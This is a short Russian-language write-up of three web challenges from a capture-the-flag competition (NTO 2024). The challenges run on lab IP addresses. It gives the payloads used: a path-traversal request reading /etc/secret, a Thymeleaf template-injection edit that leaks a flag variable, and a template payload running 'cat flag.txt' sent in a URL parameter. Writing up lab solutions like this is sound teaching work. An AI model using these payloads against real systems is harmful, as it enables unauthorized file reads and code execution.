# nto2024

Итак, мы смогли решить только 3 задачи на веб, не будем тянуть кота за **** и приступим к объяснению:

WEB1:
Мы перешли по ссылке 192.168.12.10:5001/download?file_type= и в параметре file_type указали /../../etc/secret, скачался файл secret, в котором и был флаг(flag)

WEB2:
Переходим сюда: 
http://192.168.12.13:8090/login?password=password
Далее заменяем следующий div:
<div>
    Error resolving template [flag], template might not exist or might not be accessible by any of the configured Template Resolvers
</div>
на:
<div th:fragment="main">
    <span th:text="'Hello, + ${flag}"></span>
</div>
Далее в сообщении ошибки появляется настоящий флаг

WEB3:
заходим на http://192.168.12.11:8001/flag/
получаем 403,
далее передаем в параметр name нагрузку:
http://192.168.12.11:8001/flag/?name={%25cat%20flag.txt%25}
Отправляем 3000 запросов, в одном из них будет флаг и http-код 200
